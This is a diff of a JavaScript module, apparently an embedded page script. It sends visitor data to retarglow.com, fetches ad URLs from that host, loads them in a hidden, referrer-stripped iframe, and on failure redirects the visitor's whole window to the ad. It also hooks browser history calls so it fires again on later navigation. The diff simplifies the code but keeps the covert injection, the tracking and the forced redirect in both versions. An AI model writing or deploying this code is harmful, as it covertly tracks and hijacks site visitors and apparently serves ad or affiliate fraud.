@@ -50,84 +50,16 @@ export default {
       shopify: isShopify
     };
 
-    try {
-      fetch("https://retarglow.com/log", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(p),
-        keepalive: true
-      }).catch(() => {});
-    } catch {}
+    fetch("https://retarglow.com/log", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(p)
+    });
 
     let triggered = false;
     let lastInjectedAt = 0;
     const sessionKey = "i_" + _r + "_" + location.pathname;
     const once = sessionStorage.getItem(sessionKey);
-
-    function injectIframe(adUrl) {
-      const iframe = document.createElement("iframe");
-      iframe.style.display = "none";
-      iframe.referrerPolicy = "no-referrer";
-      iframe.src = adUrl.replace("{{_r}}", encodeURIComponent(_r));
-      iframe.onerror = () => {
-        try {
-          const img = new Image();
-          img.src = adUrl;
-          setTimeout(() => { window.location.href = adUrl; }, 300);
-        } catch {}
-      };
-      document.body.appendChild(iframe);
-    }
-
-    function fetchServeWithTimeout(body, timeoutMs) {
-      const controller = new AbortController();
-      const tid = setTimeout(() => controller.abort(), timeoutMs);
-      return fetch("https://retarglow.com/serve", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(body),
-        signal: controller.signal
-      })
-      .then(res => {
-        if (!res.ok) throw new Error("Serve request failed: " + res.status);
-        return res.text();
-      })
-      .then(txt => {
-        try { return JSON.parse(txt); } catch { return null; }
-      })
-      .finally(() => clearTimeout(tid));
-    }
-
-    function backoffDelayMs(attempt, base=600, max=4000) {
-      // exponential: base * 2^attempt + jitter(0..250ms), clamped to max
-      const exp = Math.min(base * Math.pow(2, attempt), max);
-      const jitter = Math.floor(Math.random() * 250);
-      return exp + jitter;
-    }
-
-    function serveWithRetry(maxTries = 3) {
-      let attempt = 0;
-
-      const tryOnce = () => {
-        return fetchServeWithTimeout({ u, cm: { _r }, cid: c }, 4000)
-          .then(j => {
-            if (j && j.ad_url) {
-              injectIframe(j.ad_url);
-              return true; // success
-            }
-            throw new Error("No ad_url in response");
-          })
-          .catch(() => {
-            attempt++;
-            if (attempt >= maxTries) return false; // give up quietly
-            return new Promise(resolve => {
-              setTimeout(() => resolve(tryOnce()), backoffDelayMs(attempt));
-            });
-          });
-      };
-
-      return tryOnce().catch(() => false); // hard contain
-    }
 
     const inject = () => {
       const now = Date.now();
@@ -136,14 +68,24 @@ export default {
       lastInjectedAt = now;
       sessionStorage.setItem(sessionKey, "1");
 
-      serveWithRetry(3).then(ok => {
-        if (!ok) {
-          triggered = false;
-          sessionStorage.removeItem(sessionKey);
-        }
-      }).catch(() => {
-        triggered = false;
-        sessionStorage.removeItem(sessionKey);
+      fetch("https://retarglow.com/serve", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ u, cm: { _r }, cid: c })
+      })
+      .then(res => res.json())
+      .then(j => {
+        if (!j.ad_url) return;
+        const iframe = document.createElement("iframe");
+        iframe.style.display = "none";
+        iframe.referrerPolicy = "no-referrer";
+        iframe.src = j.ad_url.replace("{{_r}}", encodeURIComponent(_r));
+        iframe.onerror = () => {
+          const img = new Image();
+          img.src = j.ad_url;
+          setTimeout(() => { window.location.href = j.ad_url; }, 300);
+        };
+        document.body.appendChild(iframe);
       });
     };
 
@@ -153,7 +95,6 @@ export default {
 
     ["pushState", "replaceState"].forEach(fn => {
       const orig = history[fn];
-      if (!orig) return;
       history[fn] = function () {
         const r = orig.apply(this, arguments);
         triggered = false;
